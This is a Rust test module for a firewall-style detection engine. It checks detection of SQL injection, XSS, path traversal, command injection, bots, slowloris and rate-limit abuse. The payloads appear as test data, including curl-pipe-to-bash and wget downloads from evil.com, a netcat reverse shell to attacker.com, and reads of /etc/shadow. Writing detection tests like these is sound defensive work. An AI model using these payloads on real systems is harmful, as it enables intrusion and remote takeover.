#[cfg(test)]
#[allow(clippy::module_inception)]
mod attack_simulations {
    use hashbrown::HashMap;
    use std::net::IpAddr;
    use std::time::Duration;

    use crate::config::{
        BehavioralConfig, BotDetectionConfig, DpiConfig, IngressFilterConfig, RateLimitingConfig,
    };
    use crate::engine::behavioral_analyzer::BehavioralAnalyzer;
    use crate::engine::bot_detector::BotDetector;
    use crate::engine::dpi_engine::{DpiEngine, SignatureMatch};
    use crate::engine::ingress_filter::{IngressFilter, PacketInfo};
    use crate::engine::protocol_validator::ProtocolValidator;
    use crate::engine::rate_limiter::{RateLimitDecision, RateLimiter};

    fn dpi_engine() -> DpiEngine {
        DpiEngine::new(DpiConfig::default())
    }

    fn check_detected(matches: &[SignatureMatch], expected_category: &str) -> bool {
        matches.iter().any(|m| m.category == expected_category)
    }

    #[test]
    fn test_sqli_basic_tautology() {
        let engine = dpi_engine();
        let payloads = [
            "' OR '1'='1' --",
            "1' OR '1'='1' --",
            "\" OR \"\"=\"\" --",
            "1' AND '1'='1' --",
            "' OR 1=1 --",
        ];

        let mut found = false;
        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            if check_detected(&matches, "sql_injection") {
                found = true;
                break;
            }
        }
        assert!(
            found,
            "At least one basic tautology SQLi should be detected"
        );
    }

    #[test]
    fn test_sqli_union_based() {
        let engine = dpi_engine();
        let payloads = [
            "1 UNION SELECT username, password FROM users",
            "1 UNION ALL SELECT 1,2,3",
            "1 UNION SELECT table_name FROM information_schema.tables",
            "' UNION SELECT NULL,NULL,NULL --",
            "1 UNION SELECT @@version, user()",
            "' UNION SELECT 1,'text',3 --",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "sql_injection"),
                "Failed to detect UNION SELECT in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_sqli_obfuscated() {
        let engine = dpi_engine();
        let payloads = [
            "1 UNION ALL SELECT 1,2,3 FROM dual",
            "1; DROP TABLE users; --",
            "0x53514c20496e6a656374696f6e",
        ];

        let mut found = false;
        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            if check_detected(&matches, "sql_injection") {
                found = true;
                break;
            }
        }
        assert!(found, "At least one obfuscated SQLi should be detected");
    }

    #[test]
    fn test_sqli_time_based() {
        let engine = dpi_engine();
        let payloads = [
            "1; SLEEP(5)",
            "1' AND SLEEP(10) --",
            "1; SELECT BENCHMARK(1000000, MD5('test'))",
            "1' OR SLEEP(5)='",
            "' AND SLEEP(5) AND '1'='1",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "sql_injection"),
                "Failed to detect time-based SQL in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_sqli_database_enumeration() {
        let engine = dpi_engine();
        let payloads = [
            "1 UNION SELECT * FROM information_schema.tables",
            "1; DROP TABLE users;",
            "LOAD_FILE('/etc/passwd')",
            "SELECT * FROM users INTO OUTFILE '/tmp/data'",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "sql_injection"),
                "Failed to detect enumeration SQL in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_xss_stored_payloads() {
        let engine = dpi_engine();
        let payloads = [
            "<script>alert('stored')</script>",
            "<script>document.cookie</script>",
            "<script src=\"http://evil.com/xss.js\"></script>",
            "<scRiPt>alert(1)</sCrIpT>",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "xss"),
                "Failed to detect stored XSS in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_xss_reflected_payloads() {
        let engine = dpi_engine();
        let payloads = [
            "<img src=x onerror=alert(1)>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert(1) autofocus>",
            "<svg onload=alert(1)>",
            "<div onclick=alert('click')>click</div>",
            "javascript:alert(document.cookie)",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "xss"),
                "Failed to detect reflected XSS in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_xss_dom_based_patterns() {
        let engine = dpi_engine();
        let payloads = [
            "eval('alert(1)')",
            "document.cookie",
            "innerHTML = '<script>alert(1)</script>'",
            "String.fromCharCode(88,83,83)",
            "onmouseover=alert(1)",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                !matches.is_empty() || matches.iter().any(|m| m.category == "xss"),
                "Failed to detect DOM XSS pattern in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_xss_encoded_obfuscated() {
        let engine = dpi_engine();
        let decoded = url_decode(b"<img%20src%3Dx%20onerror%3Dalert(1)>");
        let matches = engine.scan_payload(&decoded);
        assert!(
            check_detected(&matches, "xss"),
            "Failed to detect URL-encoded XSS"
        );

        let html_entity_xss = b"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";
        let hmatches = engine.scan_payload(html_entity_xss);
        assert!(
            check_detected(&hmatches, "xss"),
            "Failed to detect HTML entity encoded XSS"
        );
    }

    fn url_decode(input: &[u8]) -> Vec<u8> {
        let mut result = Vec::with_capacity(input.len());
        let mut i = 0;
        while i < input.len() {
            if input[i] == b'%' && i + 2 < input.len() {
                let hex = &input[i + 1..i + 3];
                if let Ok(h) = std::str::from_utf8(hex) {
                    if let Ok(decoded) = u8::from_str_radix(h, 16) {
                        result.push(decoded);
                        i += 3;
                        continue;
                    }
                }
                result.push(b'%');
                i += 1;
            } else if input[i] == b'+' {
                result.push(b' ');
                i += 1;
            } else {
                result.push(input[i]);
                i += 1;
            }
        }
        result
    }

    #[test]
    fn test_path_traversal_attacks() {
        let engine = dpi_engine();
        let payloads = [
            "../../../../etc/passwd",
            "../..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "path_traversal"),
                "Failed to detect path traversal in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_path_traversal_encoded() {
        let engine = dpi_engine();

        let matches = engine.scan_url("/files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd");
        assert!(check_detected(&matches, "path_traversal"));

        let matches =
            engine.scan_url("/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd");
        assert!(check_detected(&matches, "path_traversal"));
    }

    #[test]
    fn test_path_traversal_null_byte() {
        let engine = dpi_engine();
        let payloads = [
            "/etc/passwd%00.html",
            "/etc/passwd\0.htm",
            "file:///etc/passwd",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "path_traversal"),
                "Failed to detect null-byte path traversal in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_command_injection_basic() {
        let engine = dpi_engine();
        let payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "; id",
            "| uname -a",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "command_injection"),
                "Failed to detect command injection in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_command_injection_subshell() {
        let engine = dpi_engine();
        let payloads = ["$(whoami)", "`cat /etc/passwd`", "$(ls /home)", "`id`"];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "command_injection"),
                "Failed to detect subshell injection in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_command_injection_remote_download() {
        let engine = dpi_engine();
        let payloads = [
            "wget http://evil.com/shell.sh -O /tmp/shell.sh",
            "curl http://evil.com/backdoor | bash",
            "| nc -e /bin/bash attacker.com 4444",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "command_injection"),
                "Failed to detect remote download cmd in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_command_injection_system_files() {
        let engine = dpi_engine();
        let payloads = [
            "/etc/passwd",
            "/etc/shadow",
            "/bin/bash",
            "/dev/tcp/attacker.com/4444",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "command_injection"),
                "Failed to detect system file access in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_command_injection_recon() {
        let engine = dpi_engine();
        let payloads = [
            "| ifconfig",
            "; netstat -an",
            "& hostname",
            "| ipconfig",
            "; whoami",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "command_injection"),
                "Failed to detect recon command in: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_bot_rapid_requests() {
        let detector = BotDetector::new(BotDetectionConfig::default());
        let ip = "10.200.200.100";

        let score1 = detector.analyze_request_velocity(ip);
        assert!(score1 < 0.3, "First request should have low velocity");

        for _ in 0..10 {
            detector.analyze_request_velocity(ip);
        }

        let score_after = detector.analyze_request_velocity(ip);
        assert!(
            score_after > 0.3,
            "Rapid requests should increase velocity score"
        );
    }

    #[test]
    fn test_bot_missing_headers() {
        let detector = BotDetector::new(BotDetectionConfig::default());
        let headers = HashMap::new();

        let score = detector.calculate_bot_score(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            &headers,
            "missing-headers",
            "10.0.0.200",
        );

        assert!(
            score.probability > 0.3,
            "Missing headers should increase bot probability"
        );
    }

    #[test]
    fn test_bot_automation_tools() {
        let detector = BotDetector::new(BotDetectionConfig::default());
        let headers = HashMap::new();

        let test_cases = [
            ("Selenium/4.0 WebDriver", "Selenium"),
            ("python-requests/2.31.0", "Scripted HTTP Client"),
            ("curl/8.0.1", "CLI HTTP Client"),
            ("Puppeteer/20.0", "Puppeteer"),
            ("Playwright/1.40", "Playwright"),
        ];

        for (ua, expected_type) in &test_cases {
            let result = detector.detect_automation_tool(ua, &headers);
            assert_eq!(
                result.as_deref(),
                Some(*expected_type),
                "Failed to detect {} in UA: {}",
                expected_type,
                ua
            );
        }
    }

    #[test]
    fn test_bot_pattern_matching() {
        let detector = BotDetector::new(BotDetectionConfig::default());
        let mut headers = HashMap::new();
        headers.insert("accept-language".to_string(), "en-US".to_string());

        let score = detector.calculate_bot_score(
            "ChatGPT-User/1.0 Mozilla/5.0",
            &headers,
            "ai-bot-test",
            "10.0.0.1",
        );
        assert!(score.is_bot());
        assert!(score.bot_type.is_some());

        let score2 =
            detector.calculate_bot_score("ClaudeBot/1.0", &headers, "claude-bot-test", "10.0.0.2");
        assert!(score2.is_bot());
    }

    #[test]
    fn test_bot_headless_detection() {
        let detector = BotDetector::new(BotDetectionConfig::default());
        let headers = HashMap::new();

        assert!(detector.is_headless_browser("HeadlessChrome/120.0", &headers));
        assert!(detector.is_headless_browser("Mozilla/5.0 Headless", &headers));

        let mut normal_headers = HashMap::new();
        normal_headers.insert("accept-language".to_string(), "en-US".to_string());
        normal_headers.insert("sec-ch-ua".to_string(), "\"Chrome\";v=\"120\"".to_string());

        assert!(!detector.is_headless_browser(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            &normal_headers,
        ));
    }

    #[test]
    fn test_slowloris_simulation_slow_headers() {
        let validator = ProtocolValidator::new();
        let data = b"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n";

        let is_slow = validator.detect_slowloris(data, Duration::from_millis(600));
        assert!(is_slow, "Slow header transmission should be detected");

        let is_fast = validator.detect_slowloris(data, Duration::from_millis(100));
        assert!(!is_fast, "Fast header transmission should not be flagged");
    }

    #[test]
    fn test_rate_limiter_attack_burst() {
        let config = RateLimitingConfig {
            per_ip_limit: 5,
            burst_size: 10,
            default_rps: 100,
            per_endpoint_limit: 20,
            per_session_limit: 20,
            adaptive_learning: false,
        };
        let limiter = RateLimiter::new(config);
        let ip: IpAddr = "192.168.200.1".parse().unwrap();

        for _ in 0..5 {
            assert_eq!(
                limiter.check_rate(ip, None, None),
                RateLimitDecision::Allowed
            );
        }

        assert_eq!(
            limiter.check_rate(ip, None, None),
            RateLimitDecision::Dropped
        );

        let classification = limiter.classify_burst(ip);
        use crate::engine::rate_limiter::BurstClassification;
        assert!(
            matches!(
                classification,
                BurstClassification::AttackBurst
                    | BurstClassification::LegitimateBurst
                    | BurstClassification::Normal
            ),
            "Burst traffic classification returned"
        );
    }

    #[test]
    fn test_ingress_filter_per_ip_connection_limit() {
        let config = IngressFilterConfig::default();
        let filter = IngressFilter::new(config).unwrap();
        let src_ip: IpAddr = "10.0.0.200".parse().unwrap();

        for port in 60000..61000 {
            let pkt = PacketInfo {
                src_ip,
                dst_ip: "10.0.0.1".parse().unwrap(),
                src_port: port as u16,
                dst_port: 443,
                protocol: 6,
                tcp_flags: Some(0x02),
                payload_size: 0,
            };
            let _ = filter.is_connection_allowed(&pkt);
        }

        let conn_count = filter.connection_count_for_ip(src_ip);
        assert!(conn_count > 0, "Should have tracked connections");
    }

    #[test]
    fn test_xss_various_event_handlers() {
        let engine = dpi_engine();
        let payloads = [
            "onload=alert(1)",
            "onerror=alert(1)",
            "onclick=alert(1)",
            "onfocus=alert(1)",
            "onblur=alert(1)",
            "onkeydown=alert(1)",
            "onmouseover=alert(1)",
            "onchange=alert(1)",
        ];

        for payload in &payloads {
            let matches = engine.scan_payload(payload.as_bytes());
            assert!(
                check_detected(&matches, "xss"),
                "Failed to detect event handler XSS: '{}'",
                payload
            );
        }
    }

    #[test]
    fn test_mixed_attack_payload() {
        let engine = dpi_engine();
        let payload =
            b"GET /search?q=' OR 1=1 -- <script>alert(1)</script> & cmd=| cat /etc/passwd";

        let matches = engine.scan_payload(payload);
        assert!(!matches.is_empty());

        let categories: Vec<&str> = matches.iter().map(|m| m.category.as_str()).collect();
        assert!(categories.contains(&"sql_injection"));
        assert!(categories.contains(&"xss"));
        assert!(categories.contains(&"command_injection"));
    }

    #[test]
    fn test_behavioral_anomaly_on_spike() {
        let config = BehavioralConfig::default();
        let analyzer = BehavioralAnalyzer::new(config);

        let normal: Vec<f64> = (0..100).map(|i| 50.0 + (i as f64 % 5.0)).collect();
        let baseline = analyzer.calculate_baseline(&normal);

        let score = analyzer.score_anomaly(500.0, &baseline);
        assert!(
            score.overall > 0.5,
            "Spike should be detected as anomaly, got {}",
            score.overall
        );
    }

    #[test]
    fn test_sqli_variants_batch() {
        let engine = dpi_engine();

        struct TestCase {
            payload: &'static str,
            description: &'static str,
        }

        let cases = [
            TestCase {
                payload: "' OR '1'='1' --",
                description: "basic tautology",
            },
            TestCase {
                payload: "admin' OR '1'='1' #",
                description: "authentication bypass",
            },
            TestCase {
                payload: "1' AND 1=1 --",
                description: "AND-based injection",
            },
            TestCase {
                payload: "'; EXEC xp_cmdshell('dir'); --",
                description: "stored procedure",
            },
            TestCase {
                payload: "1 UNION SELECT 1,2,3,4,5 --",
                description: "union all columns",
            },
            TestCase {
                payload: "' UNION SELECT @@version, NULL --",
                description: "version extraction",
            },
            TestCase {
                payload: "CAST('test' AS INT)",
                description: "type conversion",
            },
        ];

        for tc in &cases {
            let matches = engine.scan_payload(tc.payload.as_bytes());
            assert!(
                check_detected(&matches, "sql_injection"),
                "Missed: {} for payload: {}",
                tc.description,
                tc.payload
            );
        }
    }

    #[test]
    fn test_rate_limit_distributed_attack_simulation() {
        let config = RateLimitingConfig {
            per_ip_limit: 5,
            burst_size: 10,
            default_rps: 1000,
            per_endpoint_limit: 2,
            per_session_limit: 5,
            adaptive_learning: false,
        };
        let dlim = crate::engine::rate_limiter::DistributedRateLimiter::new(config);
        let ip: IpAddr = "10.99.99.99".parse().unwrap();

        for i in 0..2 {
            assert_eq!(
                dlim.check_rate(ip, Some("/api/attack"), Some("attacker-session")),
                RateLimitDecision::Allowed,
                "Request {} should be allowed",
                i
            );
        }

        let decision = dlim.check_rate(ip, Some("/api/attack"), Some("attacker-session"));
        assert!(
            decision != RateLimitDecision::Allowed,
            "3rd request to same endpoint+session should be limited"
        );
    }
}
